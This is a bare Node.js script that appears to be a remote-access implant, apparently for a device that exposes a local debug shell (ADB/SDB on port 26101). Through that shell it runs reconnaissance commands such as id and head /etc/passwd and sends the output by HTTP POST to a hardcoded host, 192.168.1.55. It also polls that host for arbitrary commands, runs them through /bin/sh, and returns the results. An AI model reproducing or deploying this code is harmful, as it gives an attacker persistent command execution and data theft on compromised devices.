var http = require('http');
var cp = require('child_process');
var HOST = '192.168.1.55';
function post(b) {
    try {
        var r = http.request({ host: HOST, port: 4446, method: 'POST', path: '/r' }, function () {});
        r.on('error', function () {});
        r.write(b || '');
        r.end();
    } catch (e) {}
}
post('C4?start node=' + process.version);
try {
    var adbhost = require('adbhost');
    post('C4?adbhost=ok');
    var conn = adbhost.createConnection({ host: '127.0.0.1', port: 26101 });
    conn.on('connect', function () {
        post('C4?adbsocket=connected');
        function run(cmd) {
            try {
                var st = conn.createStream('shell:0 ' + cmd);
                var buf = '';
                st.on('data', function (d) { buf += d; });
                st.on('end', function () { post('C4?SDB[' + cmd + ']=' + buf); });
                st.on('error', function (e) { post('C4?SDBERR=' + e); });
            } catch (e) { post('C4?SDBEX=' + e.message); }
        }
        run('id');
        setTimeout(function () { run('cat /proc/version'); }, 4000);
        setTimeout(function () { run('head -3 /etc/passwd'); }, 8000);
        setTimeout(function () { run('ls /'); }, 12000);
        setTimeout(function () { run('ls -la /etc | head -20'); }, 16000);
    });
    conn.on('error', function (e) { post('C4?adberr=' + e); });
} catch (e) { post('C4?require_ex=' + e.message); }
function tick() {
    http.get('http://' + HOST + ':8000/cmd', function (res) {
        var b = '';
        res.setEncoding('utf8');
        res.on('data', function (c) { b += c; });
        res.on('end', function () {
            if ((b || '').trim().length > 0) {
                var sh = cp.spawn('/bin/sh', ['-c', b]);
                var o = '', e = '';
                sh.stdout.on('data', function (d) { o += d; });
                sh.stderr.on('data', function (d) { e += d; });
                sh.on('exit', function (c) { post('RUN?code=' + c + '\n' + o + e); });
            }
            setTimeout(tick, 3000);
        });
    }).on('error', function () { setTimeout(tick, 6000); });
}
tick();
